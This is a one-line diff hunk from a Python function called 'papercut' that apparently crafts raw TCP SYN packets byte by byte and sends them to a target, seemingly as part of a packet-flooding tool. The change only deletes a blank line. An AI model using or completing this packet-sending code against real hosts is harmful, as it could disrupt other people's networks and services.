@@ -69,7 +69,6 @@ async def papercut(target: str, i):
             "\xfa\xf0" + # the rest is w/e
             "\x2e\xdf\x00\x00\x02\x04\x05\xb4\x04\x02\x08\x0a\x07\x0d\xd1\x3c" +
             "\x00\x00\x00\x00\x01\x03\x03\x07")
-
         pak = ip_packet + tcp_packet
         soc.send(pak)
         pfl('S') # sent a packet
